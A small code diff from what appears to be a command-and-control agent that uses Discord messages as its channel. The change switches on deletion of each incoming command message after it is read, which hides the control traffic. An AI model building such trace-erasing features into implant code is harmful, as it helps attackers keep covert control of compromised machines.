@@ -77,7 +77,7 @@ namespace Agent.Profiles
             if (discordMessage is not null &! discordMessage.to_server && discordMessage.client_id == _uuid) //It belongs to us
             {
                 Console.WriteLine("Got Message: " + discordMessage.message);
-                //_ = message.DeleteAsync();
+                _ = message.DeleteAsync();
 
                 if (!checkedin)
                 {
